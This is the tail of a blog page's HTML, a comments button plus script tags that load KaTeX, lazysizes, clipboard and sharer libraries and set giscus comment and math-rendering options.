            </a><a href="#" id="view-comments" class="fixed-button" title="æŸ¥çœ‹è¯„è®º">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"å¤åˆ¶åˆ°å‰ªè´´æ¿","maxShownLines":50},"comment":{"giscus":{"category":"Announcements","categoryId":"DIC_kwDOKFj8TM4CYhAR","darkTheme":"dark","emitMetadata":"0","inputPosition":"bottom","lang":"zh-CN","lazyLoading":false,"lightTheme":"light","mapping":"pathname","reactionsEnabled":"1","repo":"4ever-xxxl/4ever-xxxl.github.io","repoId":"R_kgDOKFj8TA"}},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
